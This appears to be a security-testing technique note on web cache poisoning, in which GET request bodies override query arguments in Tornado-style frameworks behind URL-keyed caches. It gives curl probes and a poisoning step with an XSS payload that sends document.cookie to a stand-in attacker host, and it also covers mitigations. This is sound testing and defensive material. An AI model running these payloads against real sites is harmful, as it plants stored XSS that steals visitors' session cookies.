# Cache Poisoning — Body Args on GET (Tornado-Style Frameworks)

## When this applies

- Backend framework merges the request body into the same arg dict as the query string AND lets body win on collision — `RequestHandler.get_argument()` in Tornado is the canonical example, but anything similar applies (some Bottle / Pylons / older Pyramid flows; PHP `$_REQUEST` when configured to merge body before query; some Spring MVC `@RequestParam` setups under specific HttpMessageConverter combos).
- Front-end cache keys the response by URL only. Examples:
  - Custom Go reverse proxy: `key := hash(req.URL.String())`
  - Node Express + `apicache`: default key is `req.originalUrl`
  - nginx with default `proxy_cache_key $scheme$proxy_host$request_uri`
  - Cloudflare and CloudFront default behaviour (URL + a small set of query-string keys + Host)
- Cache forwards GET requests verbatim to the origin (body included). HTTP/1.1 spec doesn't forbid GET bodies, and most proxies pass them through.

If all three hold, you have a stored-XSS / stored-redirect primitive for free on any cacheable URL whose handler reads `get_argument`.

## Technique

```
GET /search?query=BENIGN HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

query=<script>alert(document.cookie)</script>
```

1. Cache computes `hash(/search?query=BENIGN)` — body is not part of the key.
2. Cache forwards the request (with body) to Tornado.
3. Tornado's `self.get_argument('query')` returns the BODY value (body wins over query).
4. Tornado renders the response with the XSS payload reflected (assumes any unescaped reflection sink).
5. Cache stores the poisoned response under `/search?query=BENIGN` for the cache TTL.
6. Every subsequent legitimate `GET /search?query=BENIGN` (no body) returns the poisoned response from cache.

## Detection

```bash
# Probe — body precedence
curl -s -G 'http://<TARGET>/<path>?<param>=A' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "<param>=B-MARKER"

# If response reflects "B-MARKER", body wins → backend is Tornado-style.

# Verify caching
curl -sD- 'http://<TARGET>/<path>?<param>=A' -o /dev/null | grep -i x-cache  # → miss then hit on repeat
```

If the body-precedence probe reflects `B-MARKER` AND the cache returns `X-Cache: hit` on repeat, the primitive is in play. Test with an XSS payload to confirm impact.

## Steps

### 1. Find a Tornado handler with reflection

Read source (or fingerprint via header `Server: TornadoServer/...`). Look for handlers using `self.get_argument()` (NOT `self.get_query_argument()`) where the value is rendered into HTML, redirect URL, or response header without escaping (`autoescape=None` in app config or `{% raw %}` in template).

### 2. Confirm cache behaviour

- `X-Cache`, `Age`, `CF-Cache-Status`, `Via` response headers identify cache and TTL.
- Repeat the same URL twice — second response should be `hit` and have non-zero `Age`.

### 3. Inject XSS via body, observe cache uptake

```bash
URL='http://<TARGET>/search?query=clean'
PAYLOAD='query=<svg/onload=fetch("//attacker/?c="+document.cookie)>'

# Poison
curl -sD- -G "$URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "$PAYLOAD" -o /dev/null | head

# Verify clean GET now returns poisoned content
curl -s "$URL" | grep -F '<svg/onload'
```

### 4. Pivot

The poisoned URL must be one a target (admin user, automated bot, mass victim) will visit. Limitations:

- If the target visits a *predictable* URL (homepage, /admin, a fixed search), poisoning works directly.
- If the target visits a *random* URL drawn from a large vocabulary, the chain breaks at URL-prediction. The cache poisoning primitive itself is still real and reportable; the chain is a separate problem.

## Mitigations

- Tornado: replace `self.get_argument(name)` with `self.get_query_argument(name)` for handlers whose response should depend only on URL params. The query-only variant ignores body args.
- CDN/proxy: include a normalized body hash in the cache key when the back-end is known to merge body into GET args. nginx: `proxy_cache_key $scheme$proxy_host$request_uri$request_body`. Cloudflare: a Worker that hashes the body before lookup.
- Cache only known-safe paths — the ones that explicitly don't read `get_argument` for any rendered field.

## Anti-Patterns

- Treating GET-with-body as conformant or rare — Tornado, Bottle, and various Spring configs all merge body into args silently. Plenty of frameworks accept GET bodies.
- Assuming the cache won't forward the body — most proxies do, including nginx, Cloudflare, AWS ALB.
- Adding `Vary: Content-Type` and calling it done — the cache key is still URL-derived; `Vary` only splits cache buckets, doesn't include the body.

## Relation to other patterns

- Differs from [poisoning-unkeyed-headers.md](poisoning-unkeyed-headers.md) (`X-Forwarded-Host` etc.) — those use unkeyed *headers*; this uses unkeyed *body*.
- Differs from [poisoning-unkeyed-params.md](poisoning-unkeyed-params.md) (`?utm_*` etc.) — those use query params not in the cache key; this uses body args that the back-end honors over query params already in the key.
- Self-XSS that's normally rejected as low-impact becomes stored XSS for any cacheable URL once this primitive is in play — escalate the severity rating accordingly.
